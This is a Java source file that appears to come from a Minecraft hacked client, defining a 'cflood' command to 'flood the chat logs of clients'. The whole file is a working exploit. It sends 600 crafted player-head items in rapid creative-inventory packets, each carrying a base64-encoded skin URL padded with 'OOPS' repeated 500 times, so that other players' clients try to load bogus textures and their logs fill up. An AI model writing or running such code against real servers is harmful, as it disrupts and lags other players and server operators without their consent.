package net.shadow.client.feature.command.impl;

import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import net.shadow.client.helper.util.Utils;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtIntArray;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Random;


public class ClientFlood extends Command {
    public ClientFlood() {
        super("cflood", "flood the chat logs of clients", "cflood", "clog");
    }

    @Override
    public String[] getSuggestions(String fullCommand, String[] args) {
        return super.getSuggestions(fullCommand, args);
    }

    @Override
    public void onExecute(String[] args) {
        new Thread(() -> {
            for (int i = 0; i < 600; i++) {
                ItemStack push = new ItemStack(Items.PLAYER_HEAD, 1);
                NbtCompound main = new NbtCompound();
                NbtCompound skullowner = new NbtCompound();
                List<Integer> ids = new ArrayList<>();
                ids.add(1044599774);
                ids.add(-91344643);
                ids.add(-1626455549);
                ids.add(-827872364);
                NbtIntArray id = new NbtIntArray(ids);
                skullowner.put("Id", id);
                skullowner.put("Name", NbtString.of("CFlood" + new Random().nextInt(50000)));
                NbtCompound b = new NbtCompound();
                NbtList d = new NbtList();
                NbtCompound c = new NbtCompound();
                String texture = "{\"textures\":{\"SKIN\":{\"url\":\"https://education.minecraft.net/wp-content/uploads/" + "OOPS".repeat(500) + "" + new Random().nextInt(5000000) + ".png\"}}}";
                String base = Base64.getEncoder().encodeToString(texture.getBytes());
                c.put("Value", NbtString.of(base));
                d.add(c);
                b.put("textures", d);
                skullowner.put("Properties", b);
                main.put("SkullOwner", skullowner);
                push.setNbt(main);
                ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(ShadowMain.client.player.getInventory().selectedSlot + 36, push));
                Utils.sleep(5);
            }
        }).start();
    }
}
